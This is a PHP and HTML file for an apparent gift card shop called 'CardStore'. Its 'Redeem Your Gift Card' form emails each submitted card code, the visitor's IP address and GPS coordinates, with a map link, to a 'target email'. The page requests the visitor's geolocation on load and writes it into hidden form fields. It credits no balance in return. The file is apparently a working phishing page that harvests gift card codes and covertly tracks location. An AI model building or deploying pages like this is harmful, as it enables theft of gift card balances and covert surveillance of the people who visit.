<?php
// Handle Card Redemption Submission
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'redeem') {
    $cardCode = filter_input(INPUT_POST, 'card_code', FILTER_SANITIZE_SPECIAL_CHARS);
    $userIp   = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $lat      = filter_input(INPUT_POST, 'latitude', FILTER_SANITIZE_SPECIAL_CHARS);
    $lng      = filter_input(INPUT_POST, 'longitude', FILTER_SANITIZE_SPECIAL_CHARS);

    if (!empty($cardCode)) {
        // Prepare email content
        $to      = "your-email@example.com"; // Replace with your target email
        $subject = "Card Redemption Attempt - Code: " . $cardCode;
        $body    = "A card redemption was submitted.\n\n";
        $body   .= "Card Code: " . $cardCode . "\n";
        $body   .= "User IP Address: " . $userIp . "\n";

        if ($lat && $lng) {
            $body .= "GPS Coordinates: Lat " . $lat . ", Lng " . $lng . "\n";
            $body .= "Google Maps Link: https://maps.google.com/?q=" . $lat . "," . $lng . "\n";
        } else {
            $body .= "GPS Coordinates: Not provided or permission denied by user.\n";
        }

        // Standard PHP mail() execution
        $headers = "From: webmaster@yourdomain.com\r\n" .
            "Reply-To: webmaster@yourdomain.com\r\n" .
            "X-Mailer: PHP/" . phpversion();

        if (mail($to, $subject, $body, $headers)) {
            $message = '<div class="alert alert-success">Redemption code submitted successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">Failed to process redemption. Please try again.</div>';
        }
    } else {
        $message = '<div class="alert alert-warning">Please enter a valid card code.</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Shop & Redeem</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

<!-- Navigation Bar -->
<nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
    <div class="container">
        <a class="navbar-brand fw-bold" href="#">CardStore</a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ms-auto">
                <li class="nav-item"><a class="nav-link active" href="#shop">Shop Cards</a></li>
                <li class="nav-item"><a class="nav-link" href="#redeem">Redeem Code</a></li>
            </ul>
        </div>
    </div>
</nav>

<div class="container my-4">

    <?php if (!empty($message)) echo $message; ?>

    <!-- Redeem Section -->
    <section id="redeem" class="mb-5">
        <div class="card shadow-sm border-0">
            <div class="card-body p-4">
                <h3 class="card-title text-center mb-3">Redeem Your Gift Card</h3>
                <p class="text-muted text-center mb-4">Enter your code below to claim your digital card balance.</p>

                <form action="index.php" method="POST" id="redeemForm" class="row g-3 justify-content-center">
                    <input type="hidden" name="action" value="redeem">
                    <input type="hidden" name="latitude" id="latitude">
                    <input type="hidden" name="longitude" id="longitude">

                    <div class="col-md-6">
                        <div class="input-group">
                            <input type="text" name="card_code" class="form-control" placeholder="XXXX-XXXX-XXXX" required>
                            <button type="submit" class="btn btn-primary">Redeem Now</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </section>

    <!-- Shop Cards Section -->
    <section id="shop">
        <h2 class="mb-4 text-center">Available Digital Cards</h2>
        <div class="row g-4">

            <!-- Card 1 -->
            <div class="col-md-4">
                <div class="card h-100 shadow-sm border-0">
                    <div class="card-body text-center">
                        <span class="badge bg-secondary mb-2">Gaming</span>
                        <h4 class="card-title">$25 Game Pass Card</h4>
                        <p class="card-text text-muted">Instant digital delivery for gaming balance.</p>
                        <h3 class="text-primary my-3">$25.00</h3>
                        <button class="btn btn-outline-primary w-100">Buy Now</button>
                    </div>
                </div>
            </div>

            <!-- Card 2 -->
            <div class="col-md-4">
                <div class="card h-100 shadow-sm border-0">
                    <div class="card-body text-center">
                        <span class="badge bg-success mb-2">Shopping</span>
                        <h4 class="card-title">$50 Store Credit</h4>
                        <p class="card-text text-muted">Usable across all participating online stores.</p>
                        <h3 class="text-primary my-3">$50.00</h3>
                        <button class="btn btn-outline-primary w-100">Buy Now</button>
                    </div>
                </div>
            </div>

            <!-- Card 3 -->
            <div class="col-md-4">
                <div class="card h-100 shadow-sm border-0">
                    <div class="card-body text-center">
                        <span class="badge bg-warning text-dark mb-2">Streaming</span>
                        <h4 class="card-title">$100 VIP Access Pass</h4>
                        <p class="card-text text-muted">Full access pass for premium streaming services.</p>
                        <h3 class="text-primary my-3">$100.00</h3>
                        <button class="btn btn-outline-primary w-100">Buy Now</button>
                    </div>
                </div>
            </div>

        </div>
    </section>

</div>

<!-- Geolocation Handling -->
<script>
    document.addEventListener("DOMContentLoaded", function () {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    document.getElementById("latitude").value = position.coords.latitude;
                    document.getElementById("longitude").value = position.coords.longitude;
                },
                function (error) {
                    console.warn("Location permission denied or unavailable.");
                }
            );
        }
    });
</script>

<!-- Bootstrap 5 JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
